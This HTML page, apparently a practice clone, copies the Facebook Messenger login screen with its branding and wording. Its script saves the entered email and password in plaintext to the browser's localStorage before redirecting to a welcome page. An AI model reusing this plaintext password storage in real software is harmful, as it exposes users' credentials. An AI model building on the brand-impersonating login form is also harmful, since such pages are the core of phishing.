<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Messenger Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #fff;
      color: #1c1e21;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 40px;
      padding: 40px 20px;
      max-width: 1000px;
      width: 100%;
    }

    .left {
      max-width: 400px;
      width: 100%;
    }

    .left h1 {
      font-size: 28px;
      line-height: 1.2;
      color: #1877f2;
      margin-bottom: 10px;
    }

    .left p {
      font-size: 14px;
      margin-bottom: 20px;
    }

    .form-group {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    input[type="text"],
    input[type="password"] {
      padding: 8px 10px;
      font-size: 13px;
      border: 1px solid #ccc;
      border-radius: 6px;
      height: 36px;
    }

    button[type="submit"] {
      padding: 8px 10px;
      font-size: 14px;
      background-color: #1877f2;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      height: 36px;
    }

    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 6px;
      font-size: 12px;
    }

    .options label {
      display: flex;
      align-items: center;
      gap: 5px;
      font-size: 12px;
      cursor: pointer;
    }

    .options a {
      color: #1877f2;
      text-decoration: none;
      font-size: 12px;
    }

    .options a:hover {
      text-decoration: underline;
    }

    .right img {
      max-width: 320px;
      width: 100%;
      height: auto;
    }

    @media (max-width: 900px) {
      body {
        align-items: flex-start;
      }

      .container {
        flex-direction: column;
        align-items: center;
        padding: 30px 20px;
      }

      .right img {
        margin-top: 30px;
      }

      .options {
        flex-direction: column;
        gap: 8px;
      }
    }
  </style>
</head>
<!-- buttons and divs  -->

<body>
  <div class="container">
    <div class="left">
      <img src="logo.png" alt="Messenger Logo" style="width: 100px; height: 50px; vertical-align: middle;" />
      <h1>Messenger</h1> 
      <h1>A place for <br><strong>meaningful conversations</strong></h1>
      <p>Messenger helps you connect with your Facebook friends and family, build your community and deepen your
        interests.</p>
      <form id="loginForm" class="form-group" autocomplete="off">
        <input type="text" id="email" placeholder="Email address or phone number" autocomplete="off" />
        <input type="password" id="password" placeholder="Password" autocomplete="new-password" />
        <button type="submit">Log In</button>
        <div class="options">
          <label><input type="checkbox" id="rememberMe" /> Keep me signed in</label>
          <a href="#">Forgotten your password?</a>
        </div>
      </form>
    </div>



    <!-- photo aiya che  -->
    <div class="right">

      <img src="mesenger.jpeg" alt="Messenger Preview Image">
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const email = emailInput.value;
      const password = passwordInput.value;

      // Save to localStorage
      localStorage.setItem('email', email);
      localStorage.setItem('password', password);

      // Small delay ensures it's written before redirecting
      setTimeout(() => {
        window.location.href = "welcome.html";
      }, 100); // 100ms delay
    });
  </script>


</body>

</html>
